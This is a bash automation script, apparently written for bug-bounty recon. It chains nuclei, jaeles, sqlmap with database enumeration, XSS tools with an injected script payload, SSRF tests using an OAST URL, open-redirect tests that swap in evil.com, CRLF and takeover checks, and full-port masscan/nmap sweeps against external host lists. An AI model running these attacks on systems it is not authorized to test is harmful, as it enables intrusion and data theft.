#!/bin/bash

set -e
set -o pipefail

# Define input files
LIVE_INPUT="live_subdomains.txt"
JSURLS="livejs.txt"



# Define output folders
OUTDIR="auto_out"
LIVEDOMAINS="$OUTDIR/usable_targets.txt"
NUCLEI_OUT="$OUTDIR/nuclei"
JAELES_OUT="$OUTDIR/jaeles"
PARAM_OUT="$OUTDIR/params"
mkdir -p "$NUCLEI_OUT" "$JAELES_OUT" "$PARAM_OUT"
ALLPARAMS="$PARAM_OUT/all_params.txt"

echo "[+] filtering 400's domains to livedomains.txt..."
cat "$LIVE_INPUT" | httpx -silent -no-color -status-code -fr \
  | grep -Ev "\[(400|403|404|000)" \
  | cut -d " " -f1 > "$OUTDIR/usable_targets.txt"


# Define template paths
BASE_TEMP="/home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp"
LOSTSEC_TEMP="$BASE_TEMP/lostsec"
DOWNLOADED_TEMP="$BASE_TEMP/downloaded_all_nucleitemplates"

echo "========================="
echo "🚀 Starting Nuclei & Jaeles Automation"
echo "========================="

## === 1. SCAN LIVEDOMAINS ===
if [[ -s "$LIVEDOMAINS" ]]; then
    echo "[+] Running Nuclei on $LIVEDOMAINS ..."
    nuclei -l "$LIVEDOMAINS" -s critical,high,medium,low -o "$NUCLEI_OUT/nuclei_domain1_out" -stats 2>> "$OUTDIR/nuclei_errors.log"
    nuclei -l "$LIVEDOMAINS" -t "$DOWNLOADED_TEMP" -s critical,high,medium,low -o "$NUCLEI_OUT/nuclei_domain2_out" -stats 2>> "$OUTDIR/nuclei_errors.log"
    nuclei -l "$LIVEDOMAINS" -t "$LOSTSEC_TEMP" -s critical,high,medium,low -o "$NUCLEI_OUT/nuclei_domain3_out" -stats 2>> "$OUTDIR/nuclei_errors.log"
    nuclei -l "$LIVEDOMAINS" -t /home/maddy/nuclei-templates/http/misconfiguration -o "$NUCLEI_OUT/nuclei_domain4_out" -stats 2>> "$OUTDIR/nuclei_errors.log"

    echo "[+] Running Jaeles on $LIVEDOMAINS ..."
    cat "$LIVEDOMAINS" | jaeles scan  -v -c 50  -o "$JAELES_OUT/jaeles_domain_out" 2>> "$OUTDIR/jaeles_errors.log"
else
    echo "[!] $LIVEDOMAINS not found or empty. Skipping domain scans."
fi

## === 2. SCAN JS FILES ===
if [[ -s "$JSURLS" ]]; then
    echo "[+] Running Nuclei on JS URLs ..."
    grep -E -v 'cdn|cloudflare|googletag|googleapis|bootstrapcdn|jquery|fonts|addthis|facebook|twitter|gstatic|optimizely|newrelic|akamai|doubleclick|bing|jsdelivr' "$JSURLS" \
  | grep -E '^https?://' \
  | sort -u > clean_js.txt
    # JS-specific scan using only relevant templates
    nuclei -l clean_js.txt \
  -t "$DOWNLOADED_TEMP/exposures" \
  -t "$LOSTSEC_TEMP/exposures" \
  -t /home/maddy/nuclei-templates/javascript \
  -t /home/maddy/nuclei-templates/http/exposures \
  -s critical,high,medium,low \
  -o "$NUCLEI_OUT/nuclei_js_effective_out" \
  -stats 2>> "$OUTDIR/nuclei_errors.log"
    rm clean_js.txt
   

    ###echo "[+] Running Jaeles on JS URLs ..."
    ###cat clean_js.txt | jaeles scan  -v -c 50 -o "$JAELES_OUT/jaeles_js_out"
else
    echo "[!] $JSURLS not found or empty. Skipping JS URL scans."
fi

# === 3. PARAMETERIZED URLS ENUM ===
echo "[+] Running ParamSpider..."
paramspider -l "$LIVEDOMAINS"

echo "[+] Extracting parameterized URLs from all_urls.txt ..."
cat all_urls.txt | grep -E '\?[^=]+=.+$' > regex.txt

echo "[+] Running LostFuzzer..."
/home/maddy/techiee/bug_bounty/2_phase_recon_autom/tools/lostfuzzer.sh | tee -a "$NUCLEI_OUT/nuclei_lostfuzzer_out"
mv filtered_urls.txt loxs_param.txt

echo "[+] Combining all parameterized URLs..."
cat results/* regex.txt loxs_param.txt | grep -E '\?.+=.+' | grep -Ev '\.(woff2?|ttf|svg|eot|css|js|png|jpe?g|gif|ico|mp4|webp|bmp|json|xml)(\?|$)'  | grep -Ev 'cdn|cloudflare|googletag|googleapis|bootstrapcdn|jquery|fonts|addthis|facebook|twitter|gstatic|optimizely|newrelic|akamai|doubleclick|bing|jsdelivr|youtube|ytimg'  | sort -u  > "$ALLPARAMS"

 ## === 4. SCAN PARAMETERIZED URLS ===
 if [[ -s "$ALLPARAMS" ]]; then
    echo "[+] Running Nuclei on Parameterized URLs ..."
    nuclei -l "$ALLPARAMS" \
  -t /home/maddy/nuclei-templates/http/vulnerabilities/ \
  -t /home/maddy/nuclei-templates/headless/headless-open-redirect.yaml \
  -t "$DOWNLOADED_TEMP" \
  -t "$LOSTSEC_TEMP/vulnerabilities/" \
  -tags sqli,xss,lfi,rfi,redirect,ssti,rce \
  -s critical,high,medium,low \
  -o "$NUCLEI_OUT/nuclei_param_vulns_out" \
  -stats -dast 2>> "$OUTDIR/nuclei_errors.log"

    echo "[+] Running Jaeles on Parameterized URLs ..."
    
    find ~/.jaeles -type f -name '*.yaml' | \
    grep -i 'sqli\|xss\|ssti\|ssrf\|rce\|cmdi\|open-red' | \
    xargs -I % jaeles scan -v -s "%" -U "$ALLPARAMS"-c 50  -o "$JAELES_OUT/jaeles_params_out" 2>> "$OUTDIR/jaeles_errors.log"

else
    echo "[!] No parameterized URLs found. Skipping parameter scans."
fi

echo "✅ Automation  1 ..Complete! All outputs saved in: $OUTDIR"


# ------------------------------------------------PART 2------------------------------------------------
#!/bin/bash

echo "============================================"
echo "[*] Starting General Bug Automation Recon"
echo "============================================"

#0. Hidden Parameters Discovery using Arjun
echo "[*] Finding Hidden Parameters using Arjun..."
cat "$ALLPARAMS" | parallel -j 3 --delay 2 '
    echo "[+] Scanning for hidden params: {}" | tee -a "'"$OUTDIR"'/hidden_params.txt"
    arjun --stable -u "{}" -oT - 2>/dev/null >> "'"$OUTDIR"'/hidden_params.txt"
    echo -e "\n" >> "'"$OUTDIR"'/hidden_params.txt"
'

#----------------------------------------------
#1. SQL Injection (SQLi)
#----------------------------------------------

echo "[*] Testing for SQLi using  sqlmap..."

script -q -c " python3 /home/maddy/techiee/bug_bounty/2_phase_recon_autom/tools/sqlmap/sqlmap.py -m "$ALLPARAMS" --level 5 --risk 3 --batch --dbs --tamper=between --random-agent" sqlmap_output.txt 2>> "$OUTDIR/sqlmap_errors.log"

echo "[*] Testing for SQLi using nuclei..."

nuclei -tags sqli,injection,error,blind,time,post,database,mysql,postgresql,mssql,azure-sql,google-cloud-sql,dast \
   -l "$ALLPARAMS" --rate-limit 200 --retries 2 -o "$OUTDIR/sqli_results.txt" -stats 2>> "$OUTDIR/nuclei_errors.log"

# ----------------------------------------------
# 2. Cross Site Scripting (XSS)
# ----------------------------------------------
echo "[*] Testing using xss vibes..."
python3 /home/maddy/techiee/bug_bounty/2_phase_recon_autom/tools/xss_vibes/main.py -f "$ALLPARAMS" -o "$OUTDIR/xss_vibes_out" 2>> "$OUTDIR/xssvibes_errors.log"

echo "[*] Testing for reflected XSS using xssstrike..."
cat "$ALLPARAMS" | parallel -j 10 "python3 /path/to/xsstrike.py -u {}" >> "$OUTDIR/xss_xsstrike_out"


echo "[*] Testing for XSS using dalfox..."
dalfox file "$ALLPARAMS" --output  "$OUTDIR/xss_dalfox_out" --output-all 2>> "$OUTDIR/dalfox_errors.log"


echo "[*] Testing for reflected XSS manually..."
cat "$ALLPARAMS" | qsreplace '"/><script>confirm(1)</script>' >  "$OUTDIR/xss.txt"
while read host; do
    echo "[+] Testing: $host"
    if curl --silent --path-as-is --insecure "$host" | grep -q "confirm(1)"; then
        echo "$host [VULNERABLE]" | tee -a  "$OUTDIR/xss_curl_results.txt"
    else
        echo "$host [Not Vulnerable]" | tee -a  "$OUTDIR/xss_curl_results.txt"
    fi
done <  "$OUTDIR/xss.txt"

# ----------------------------------------------
# 3. Server-Side Request Forgery (SSRF)
# ----------------------------------------------

echo "[*] SSRF Test: Replacing parameters with Collaborator URL..."
cat "$ALLPARAMS" | qsreplace 'https://<your-oast-here>.oast.fun' | tee  -a "$OUTDIR/ssrf_urls_ffuf"

echo "[*] Running FFUF for SSRF URLs..."
ffuf -c -w ssrf_urls_ffuf -u FUZZ | tee -a "$OUTDIR/ssrf_ffuf_output.txt"

echo "[*] SSRF Nuclei testing (Blind SSRF and Response SSRF)..."
cat "$ALLPARAMS" | nuclei -t ~/nuclei-templates/dast/vulnerabilities/ssrf/blind-ssrf.yaml --retries 2 --dast -o  "$OUTDIR/ssrf_nuclei_blind.txt" -stats
cat "$ALLPARAMS" | nuclei -t ~/nuclei-templates/dast/vulnerabilities/ssrf/response-ssrf.yaml --retries 2 --dast -o  "$OUTDIR/ssrf_nuclei_response.txt" -stats

# ----------------------------------------------
# 4. Open Redirect
# ----------------------------------------------

echo "[*] Filtering potential redirect parameters..."
cat all_urls.txt "$ALLPARAMS" | grep -iE "=[^ ]*(http|https):\/\/|returnUrl=|redirect|continue=|next=|url=|uri=|dest=|target=|=http|returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=" | tee -a  "$OUTDIR/redirect_params.txt"

echo "[*] Open Redirect using HTTPX..."
cat redirect_params.txt | qsreplace "https://evil.com" | httpx -silent -fr -status-code | grep "\[3" >>  "$OUTDIR/open_httpx_out.txt"

###echo "[*] Open Redirect using curl..."
###cat redirect_params.txt | qsreplace "https://evil.com" | xargs -I {} curl -s -o /dev/null -w "%{url_effective} -> %{redirect_url}\n" {} | tee -a "$OUTDIR/open_curl_out.txt"

echo "[*] Open Redirect using nuclei..."
cat "$OUTDIR/redirect_params.txt" | qsreplace "https://evil.com" | nuclei -tags redirect -c 30 -o  "$OUTDIR/open_nuclei_out.txt"

# ----------------------------------------------
# 5. Subdomain Takeover
# ----------------------------------------------

echo "[*] Testing for Subdomain Takeover with nuclei..."
nuclei -l live_subdomains.txt -t ~/nuclei-templates/http/takeovers -o  "$OUTDIR/takeover_out1.txt" -stats
nuclei -profile ~/nuclei-templates/profiles/subdomain-takeovers.yml -l live_subdomains.txt -o  "$OUTDIR/takeover_out2.txt" -stats

echo "[*] Testing for Subdomain Takeover with subzy..."
subzy run --targets live_subdomains.txt | tee -a "$OUTDIR/takeover_out3.txt"

# ----------------------------------------------
# 6. WordPress Vulnerabilities
# ----------------------------------------------

echo "[*] Detecting WordPress vulnerabilities with nuclei..."
nuclei -l live_subdomains.txt -t ~/nuclei-templates/http/vulnerabilities/wordpress -o  "$OUTDIR/wordpress_vuln.txt" -stats
nuclei -l live_subdomains.txt -t ~/nuclei-templates/http/technologies/wordpress-detect.yaml -o  "$OUTDIR/wordpress_detect.txt" -stats

# ----------------------------------------------
# 7. CORS Misconfigurations
# ----------------------------------------------

echo "[*] Checking CORS configurations..."
nuclei -l live_subdomains.txt -tags cors -o  "$OUTDIR/nuclei_cors.txt" -stats 2>> "$OUTDIR/nuclei_errors.log"

# ----------------------------------------------
# 8. CRLF Injection
# ----------------------------------------------

echo "[*] CRLF Injection with crlfi..."
crlfi -i live_subdomains.txt -o  "$OUTDIR/crlf_crlfi.txt"

echo "[*] CRLF Injection with crlfuzz (domains)..."
crlfuzz -l live_subdomains.txt | tee -a  "$OUTDIR/crlf_crlfuzz.txt"

###echo "[*] CRLF Injection with crlfsuite..."
###crlfsuite -iT live_subdomains.txt -oN  "$OUTDIR/crlf_crlfsuite.txt"

echo "[*] CRLF Injection using nuclei templates..."
nuclei -t ~/nuclei-templates/dast/vulnerabilities/crlf/ -l live_subdomains.txt -dast -o  "$OUTDIR/crlf_nuclei_out1.txt" -stats 2>> "$OUTDIR/nuclei_errors.log"
nuclei -t ~/nuclei-templates/http/vulnerabilities/generic/crlf-injection-generic.yaml -l live_subdomains.txt -o  "$OUTDIR/crlf_nuclei_out2.txt" -stats 2>> "$OUTDIR/nuclei_errors.log"
nuclei -t ~/nuclei-templates/http/vulnerabilities/other/viewlinc-crlf-injection.yaml -l live_subdomains.txt -o  "$OUTDIR/crlf_nuclei_out3.txt" -stats 2>> "$OUTDIR/nuclei_errors.log"


#-------------------------------------PORT SCANNING---------------------------------
#!/bin/bash

echo "Starting port scanning..."

# Create main results folder
mkdir -p portscan

# Clean domain list (remove http(s):// and trailing slashes)
sed -E 's|https?://||; s|/$||' live_subdomains.txt > portscan/cleaned_domains.txt

# Build domain to IP mapping file (one line per domain-ip)
echo "[*] Building domain-ip map..."
rm -f portscan/domain_ip_map.txt
while read -r domain; do
    ips=$(dig +short "$domain" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}')
    if [ -n "$ips" ]; then
        for ip in $ips; do
            echo "$domain $ip" >> portscan/domain_ip_map.txt
        done
    fi
done < portscan/cleaned_domains.txt


# Extract unique IPs for scanning
cut -d' ' -f2 portscan/domain_ip_map.txt | sort -u > portscan/ips_domain.txt

# Run masscan on all IPs
echo "[*] Running masscan..."
masscan -iL portscan/ips_domain.txt -p1-65535 --rate 1000 -oG portscan/masscan_results.txt

# Parse masscan results to get ip-port list
awk '/Ports:/ {
  for (i = 1; i <= NF; i++) {
    if ($i == "Host:") ip = $(i+1);
    if ($i == "Ports:") {
      split($(i+1), port, "/");
      print ip, port[1];
    }
  }
}' portscan/masscan_results.txt > portscan/ip_port_list.txt

# Create output directory for Nmap results inside portscan
mkdir -p portscan/nmap

echo "[*] Starting detailed Nmap scans..."

cat portscan/ip_port_list.txt | parallel -j 10 '
  ip_port=({}); ip=${ip_port[0]}; port=${ip_port[1]};
  domains=$(grep " $ip$" portscan/domain_ip_map.txt | awk "{print \$1}" | tr "\n" "_" | sed "s/_$//");
  [[ -z "$domains" ]] && domains="unknown_domain";
  nmap -p "$port" -sV -T4 -oN "portscan/nmap/nmap_detailed_${domains}_${ip}.txt" "$ip"
'


echo "[*] Starting Nmap port scans this might take long time......"
nmap -p- --open -sV -T4 -oN portscan/nmap_results.txt -iL portscan/cleaned_domains.txt


echo "All scans completed."

echo "Finished portscanning....."

echo "============================================"
echo "[+] Automation Completed!..keep pushing maddyyy!"
echo "============================================"
